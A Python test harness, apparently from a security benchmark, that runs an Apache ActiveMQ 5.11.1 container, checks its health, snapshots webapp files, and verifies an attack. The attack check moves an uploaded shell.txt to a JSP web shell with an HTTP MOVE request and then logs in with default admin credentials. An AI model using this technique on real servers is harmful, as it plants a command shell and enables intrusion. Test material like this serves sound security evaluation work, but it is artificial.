import os
from basic.server_state import ServerState
from basic.file_data import FileData
import requests
import json
import time
from docker import DockerClient

CAPTURED_PATH = "/tmp/activemq_files"

if os.path.exists(f"{CAPTURED_PATH}"):
    os.system(f"sudo rm -rf {CAPTURED_PATH}")
os.makedirs(CAPTURED_PATH)
os.chmod(CAPTURED_PATH, 0o777)

def hc_single(scene) -> bool:
    success = False
    try:

        http_port = scene.target_container['ports'][0]

        response = requests.get(f"http://localhost:{http_port}")
        #print(response.text)
        if "Apache ActiveMQ" in response.text:
            success = True

    except (StopIteration, requests.RequestException):
        return False
    
    return success

def get_files_from_docker(container_name, directory):  
    client = DockerClient.from_env()  
    container = client.containers.get(container_name)  
    

    command = f'find {directory} -maxdepth 1 -type f'  
    files = container.exec_run(command)  
    file_list = files.output.decode().strip().split('\n')  
    
    results = []  
    for file_path in file_list:  
        if not file_path.strip():  
            continue  

        cat_cmd = f'cat {file_path}'  
        file_content = container.exec_run(cat_cmd, demux=True)  
        # file_content.output 为bytes，demux=True → (stdout, stderr)  
        content_bytes = file_content.output[0] if file_content.output else b''  
        file_name = os.path.basename(file_path)
        results.append({'file_name': file_name, 'content': content_bytes})  
    return results  

def get_state(container_name: str, http_port: int, save_tag: str = "demo") -> ServerState:

    file_path = "/opt/apache-activemq-5.11.1/webapps/api"
    files = get_files_from_docker(container_name, file_path)
    filedatas = []
    filedatas.extend([FileData(file_path=file_path, file_name=file['file_name'], file_content=file['content']) for file in files])

    file_path = "/opt/apache-activemq-5.11.1/webapps/fileserver"
    files = get_files_from_docker(container_name, file_path)
    filedatas.extend([FileData(file_path=file_path, file_name=file['file_name'], file_content=file['content']) for file in files])
    
    return ServerState(
        file_state=filedatas,
        db_state=[]
    )


def check_attack(http_port: int, container_id: str, session: requests.Session, db_port: int) -> bool:
    try:
        url = f"http://localhost:{http_port}/fileserver/shell.txt"
        headers = {  
            "Destination": "file:///opt/activemq/webapps/api/shell.jsp"
        }
        session.request("MOVE", url, headers=headers)  
        time.sleep(2)  

        response = requests.get(f"http://localhost:{http_port}/api/shell.jsp", auth=("admin", "admin"))  
        if response.status_code == 200 and "NAME=\"cmd\"" in response.text:  
            return True
        else:
            return False
    except:
        return False